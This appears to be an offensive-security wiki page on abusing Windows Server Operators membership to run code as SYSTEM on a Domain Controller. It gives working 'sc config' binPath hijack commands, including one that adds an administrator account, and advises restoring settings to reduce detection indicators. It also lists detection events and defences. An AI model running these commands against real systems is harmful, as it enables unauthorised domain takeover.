# Server Operators

**Server Operators** can administer Domain Controllers — including **managing services**. Since services run as SYSTEM (or as accounts like `LocalSystem`), a Server Operator can reconfigure a service's binary path to an attacker payload and restart it, executing code as SYSTEM on the DC. It is one of the most direct built-in-group escalations because it uses nothing but the standard `sc` service-control commands the group is designed to allow.

## Confirm membership

```cmd
whoami /groups | findstr /i "Server Operators"
```

## Exploitation

1. Pick a non-critical service you can restart and hijack its `binPath`:

```cmd
sc config VulnSvc binPath= "C:\Windows\Temp\add_admin.exe"
```

A common one-liner adds a local/domain admin:

```cmd
sc config VulnSvc binPath= "cmd /c net localgroup administrators pwn /add"
```

2. Restart the service to run the new command as SYSTEM:

```cmd
sc stop VulnSvc & sc start VulnSvc
```

3. Restore the original `binPath` afterwards to reduce disruption and IOCs.

The mechanics are identical to [Insecure Service Permissions(binPath)](../Services-Exploitation/Insecure-Service-Permissions(binPath).md) — the difference is that Server Operators membership *grants* the reconfigure right rather than it being a misconfiguration.

## Detection and defenses

- **Detection:** `sc config`/`ChangeServiceConfig` on a DC by a Server Operator, a service binary path changing to a temp/user path then restarting (Event ID 7040, 4697).
- **Defenses:** minimise Server Operators membership (tier-0 on DCs); monitor service-configuration changes; prefer granular delegation.

## Related
- [Windows Built in Groups](Windows-Built-in-Groups.md) — group overview and escalation map
- [Insecure Service Permissions(binPath)](../Services-Exploitation/Insecure-Service-Permissions(binPath).md) — the same binPath-hijack mechanics
- [Services Exploitation](../Services-Exploitation/Services-Exploitation.md) — service enumeration and control
- Offensive Active Directory — Server Operators is a DC escalation path
